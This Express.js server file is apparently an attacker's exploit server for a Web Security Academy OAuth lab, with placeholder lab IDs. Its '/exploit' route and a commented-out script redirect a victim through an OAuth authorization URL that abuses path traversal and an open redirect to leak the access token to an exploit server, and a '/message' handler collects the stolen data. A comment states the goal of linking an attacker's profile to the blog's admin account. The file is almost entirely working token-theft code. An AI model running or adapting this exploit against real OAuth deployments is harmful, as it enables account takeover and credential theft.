const express = require('express');
const app = express();
const port = 3000;

app.use(express.static('public'));

// Intent: Complete the OAuth flow using your social media profile,
// attaching it to the admin account on the blog website.
app.get('/deliver-to-victim', (req, res) => {
    res.sendFile(__dirname + '/public/oauth-linking.html');
});

app.get('/deliver-to-victim2', (req, res) => {
    res.sendFile(__dirname + '/public/oauth-commentForm.html');
});

app.get('/exploit', (req, res) => {
    if (!req.query.hash) {
        res.redirect('https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email');
    } else {
        res.redirect('/#' + req.query.hash);
    }
});

app.post('/message', (req, res) => {
    const data = req.body;
    console.log('Received message:', data);
    // Aqui você pode implementar a lógica para manipular os dados recebidos, como enviar uma requisição fetch
    // No exemplo abaixo, apenas enviaremos uma resposta 200 OK
    fetch("/" + encodeURIComponent(data.data))
    res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server is listening at http://localhost:${port}`);
});


{/* <script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script> */}